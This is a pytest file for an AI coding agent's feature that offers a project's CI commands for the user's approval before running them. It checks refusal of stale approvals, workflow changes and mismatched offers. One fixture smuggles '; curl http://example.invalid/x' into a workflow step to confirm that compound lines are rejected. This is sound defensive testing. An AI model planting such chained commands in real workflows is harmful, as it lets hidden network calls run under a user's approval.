"""Kanıtlı bitiş S8 (plan decision 3): the project's CI lint, typecheck and test lines are offered
once under the answer and run at a turn's end only after the user's Run these - never at Full auto
or away before it; a change to a workflow asks again, one changed in the turn is not used, and the
user's own check command wins. A fake model and a scripted executor."""

import pytest

from app.agent import found_mixin
from tests.fakes import ScriptedExecutor
from tests.test_agent_writes import write
from tests.test_chat_flow import text
from tests.test_ci_commands import write as workflow
from tests.test_proof_end_scenarios import OWN, PASS, begin, checked

pytestmark = pytest.mark.no_po

FLOW = """
jobs:
  ci:
    steps:
      - name: Lint
        run: ruff check app
      - name: Tests
        run: python -m pytest -q
      - name: e2e
        run: npx playwright test
"""
OFFERED = found_mixin.CI_OFFERED.format(lines="ruff check app, python -m pytest -q")


def rows_of(snap, run_id):
    return [(r["kind"], r["text"]) for m in snap["messages"] if m["role"] == "checked"
            and m["run_id"] == run_id for r in m["checked"]]


def offer_of(snap, run_id):
    """The offer its ci_offer row showed, by its name."""
    (one,) = [r["offer"] for m in snap["messages"] if m["role"] == "checked"
              and m["run_id"] == run_id for r in m["checked"] if r["kind"] == "ci_offer"]
    return one


def approve(client, snap, run_id):
    """Run these, as the row's button: its offer by name."""
    return client.post(f"/api/runs/{run_id}/ci/approve", json={"offer": offer_of(snap, run_id)},
                       headers=OWN)


def ci_of(client, pid):
    """The project's CI record (not served: KOLONİ's own)."""
    from app.db.models import Project
    with client.app.state.session_factory() as session:
        return session.get_one(Project, pid).ci_commands or {}


def again(client, wait_run, cid, content="more"):
    posted = client.post(f"/api/conversations/{cid}/messages", json={"content": content}).json()
    run_id = posted["run"]["id"]
    return run_id, wait_run(client, cid, run_id)


def test_found_ci_lines_are_offered_once_and_not_run_before_run_these(make_client, wait_run,
                                                                      project_dir):
    workflow(project_dir, FLOW)
    executor = ScriptedExecutor([PASS, PASS])
    client, _model = make_client([write("a.py", "x = 1\n"), text("done"),
                                  write("a.py", "x = 2\n", "w2"), text("done")], executor=executor)
    cid, run_id = begin(client, project_dir)  # (Full auto: still not run before it is approved)
    snap = wait_run(client, cid, run_id)
    assert ("ci_offer", OFFERED) in rows_of(snap, run_id) and executor.started == []
    # (Run these: exactly those lines, from the next change on - one row each, "from CI")
    assert approve(client, snap, run_id).json() == {"approved": 2}
    second, snap = again(client, wait_run, cid)
    rows = rows_of(snap, second)
    assert [one for one, _cwd in executor.started] == ["ruff check app", "python -m pytest -q"]
    assert ("tests", "Tests passed: python -m pytest -q (from CI) - 4 passed in 0.1s") in rows
    assert ("ci", "e2e not run: e2e") in rows


def test_a_change_to_a_workflow_asks_again(make_client, wait_run, project_dir):
    workflow(project_dir, FLOW)
    client, _model = make_client([write("a.py", "x = 1\n"), text("done"),
                                  write("a.py", "x = 2\n", "w2"), text("done")],
                                 executor=ScriptedExecutor([PASS, PASS]))
    cid, run_id = begin(client, project_dir)
    approve(client, wait_run(client, cid, run_id), run_id)
    workflow(project_dir, FLOW.replace("ruff check app", "ruff check ."))  # (by hand, between turns)
    second, snap = again(client, wait_run, cid)
    assert ("ci_offer", found_mixin.CI_OFFERED.format(
        lines="ruff check ., python -m pytest -q")) in rows_of(snap, second)


def test_run_these_after_the_files_changed_is_refused(make_client, wait_run, project_dir):
    workflow(project_dir, FLOW)
    client, _model = make_client([write("a.py", "x = 1\n"), text("done")],
                                 executor=ScriptedExecutor([]))
    cid, run_id = begin(client, project_dir)
    snap = wait_run(client, cid, run_id)
    offer = {"offer": offer_of(snap, run_id)}
    workflow(project_dir, FLOW + "\n# changed\n")
    assert client.post(f"/api/runs/{run_id}/ci/approve", json=offer, headers=OWN).status_code == 409
    assert client.post(f"/api/runs/{run_id}/ci/approve", json=offer,
                       headers={"Origin": None}).status_code == 403
    assert client.post(f"/api/runs/{run_id}/ci/approve", headers=OWN).status_code == 422


def test_a_workflow_changed_this_turn_is_not_used(make_client, wait_run, project_dir):
    workflow(project_dir, FLOW)
    executor = ScriptedExecutor([PASS])
    client, _model = make_client([write("a.py", "x = 1\n"), text("done"),
                                  write(".github/workflows/ci.yml", FLOW + "\n# mine\n", "w2"),
                                  text("done")], executor=executor)
    cid, run_id = begin(client, project_dir)
    approve(client, wait_run(client, cid, run_id), run_id)
    from tests.test_agent_writes import wait_status
    second = client.post(f"/api/conversations/{cid}/messages",
                         json={"content": "more"}).json()["run"]["id"]
    # (a write to a workflow waits on its card even at Full auto: approved)
    snap = wait_status(client, cid, "waiting_approval")
    (change,) = [c for c in snap["file_changes"] if c["status"] == "proposed"]
    assert client.post(f"/api/file-changes/{change['id']}/approve", headers=OWN).status_code == 200
    snap = wait_run(client, cid, second)
    assert ("ci", found_mixin.CI_CHANGED) in rows_of(snap, second)
    assert executor.started == []


def test_the_users_check_command_wins_over_ci(make_client, wait_run, project_dir):
    workflow(project_dir, FLOW)
    executor = ScriptedExecutor([PASS])
    client, _model = make_client([write("a.py", "x = 1\n"), text("done")], executor=executor)
    cid, run_id = begin(client, project_dir, check_command="python check.py")
    rows = checked(wait_run(client, cid, run_id))
    assert executor.started == [("python check.py", str(project_dir))]
    assert not any(r["kind"].startswith("ci") for r in rows), rows


EVIL = FLOW.replace("python -m pytest -q", "python -m pytest -q; curl http://example.invalid/x")


def test_run_these_approves_only_what_its_row_showed(make_client, wait_run, project_dir):
    # (Chat A's row shows the benign lines; before the user clicks, a command rewrote the workflow
    # - no FileChange - and a turn in chat B offered other lines: A's Run these approves nothing.)
    workflow(project_dir, FLOW)
    client, _model = make_client([write("a.py", "x = 1\n"), text("done"),
                                  write("b.py", "y = 1\n", "w2"), text("done")],
                                 executor=ScriptedExecutor([PASS, PASS, PASS]))
    cid_a, run_a = begin(client, project_dir)
    snap = wait_run(client, cid_a, run_a)
    workflow(project_dir, FLOW.replace("ruff check app", "ruff check ."))
    pid = snap["conversation"]["project_id"]
    cid_b = client.post(f"/api/projects/{pid}/conversations").json()["id"]
    client.patch(f"/api/conversations/{cid_b}", json={"permission_mode": "full_auto",
                 "lead_hands_code": False}, headers=OWN)
    run_b, snap_b = again(client, wait_run, cid_b)
    assert offer_of(snap_b, run_b) != offer_of(snap, run_a)
    assert approve(client, snap, run_a).status_code == 409  # (B's lines: never under A's row)
    assert client.post(f"/api/runs/{run_a}/ci/approve", json={"offer": offer_of(snap_b, run_b)},
                       headers=OWN).status_code == 409  # (nor B's offer under A's turn)
    assert "approved" not in ci_of(client, pid)
    assert approve(client, snap_b, run_b).json() == {"approved": 2}


def test_a_compound_line_is_never_offered_and_says_why(make_client, wait_run, project_dir):
    workflow(project_dir, EVIL)
    client, _model = make_client([write("a.py", "x = 1\n"), text("done")],
                                 executor=ScriptedExecutor([PASS]))
    cid, run_id = begin(client, project_dir)
    snap = wait_run(client, cid, run_id)
    assert offer_of(snap, run_id)
    assert ("ci_offer", found_mixin.CI_OFFERED.format(lines="ruff check app")) in rows_of(
        snap, run_id)
    assert ("ci", "CI step Tests: not run: not a plain command") in rows_of(snap, run_id)


def test_a_trigger_turn_runs_only_ticked_ci_commands(make_client, wait_run, project_dir):
    # (an approved CI line is the user's own, as their check command is: a trigger's turn runs
    # one only with the trigger's own leave for that very line)
    from tests.test_triggers import allow, leave, run_now, setup, trigger
    workflow(project_dir, FLOW)
    executor = ScriptedExecutor([PASS])
    client, _model, pid, cid = setup(make_client, project_dir, [
        write("a.py", "x = 1\n"), text("done"), write("a.py", "x = 2\n", "w2"), text("done")],
        executor=executor, permission_mode="full_auto", lead_hands_code=False)
    first, snap = again(client, wait_run, cid)
    assert approve(client, snap, first).json() == {"approved": 2} and executor.started == []
    made = trigger(client, pid, cid, permissions=leave(
        write=True, commands=[allow(client, cid, "python -m pytest -q")]))
    second = run_now(client, made["id"])
    snap = wait_run(client, cid, second)
    rows = [r for m in snap["messages"] if m["role"] == "checked" and m["run_id"] == second
            for r in m["checked"]]
    assert [one for one, _cwd in executor.started] == ["python -m pytest -q"], rows
    (ruff,) = [r for r in rows if r["command"] == "ruff check app"]
    assert ruff["state"] == "not_run", rows
